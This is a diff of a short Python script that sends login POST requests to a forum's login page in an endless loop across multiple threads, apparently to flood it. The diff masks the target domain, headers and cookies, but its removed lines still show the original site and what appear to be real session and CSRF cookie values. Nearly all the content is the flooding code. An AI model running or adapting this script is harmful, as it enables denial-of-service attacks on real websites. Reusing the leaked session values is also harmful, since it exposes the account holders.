@@ -3,22 +3,22 @@ import threading
 
 
 cookies = {
-    'xf_csrf': 'EpbBAEQkLQqW7auT',
-    'xf_session': 'DCJ7sLXQo6tUfK0FWTam-lmmSB0ojiOJ',
+    'xf_csrf': '***************',
+    'xf_session': '***************',
 }
 
 headers = {
-    'authority': 'hacksturkey.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-    'accept-language': 'tr-TR;q=0.5',
-    'cache-control': 'max-age=0',
+    'authority': '***************',
+    'accept': '***************',
+    'accept-language': '***************',
+    'cache-control': '***************',
     # Requests sorts cookies= alphabetically
-    'cookie': 'xf_csrf=EpbBAEQkLQqW7auT; xf_session=DCJ7sLXQo6tUfK0FWTam-lmmSB0ojiOJ',
-    'origin': 'https://hacksturkey.com',
-    'referer': 'https://hacksturkey.com/giris/login',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
+    'cookie': '***************',
+    'origin': '***************',
+    'referer': '***************',
+    'sec-fetch-dest': '***************',
+    'sec-fetch-mode': '***************',
+    'sec-fetch-site': '***************',
     'sec-fetch-user': '?1',
     'sec-gpc': '1',
     'upgrade-insecure-requests': '1',
@@ -30,12 +30,12 @@ data = {
     'login': 'asasdasdasdsa',
     'password': 'asdsadsad',
     'remember': '1',
-    '_xfRedirect': 'https://hacksturkey.com/',
+    '_xfRedirect': 'https://***************.com/',
 }
 
 def script():
     while True:
-        response = requests.post('https://hacksturkey.com/giris/login', cookies=cookies, headers=headers, data=data).text
+        response = requests.post('https://***************', cookies=cookies, headers=headers, data=data).text
 
         print(response)
 threads = []
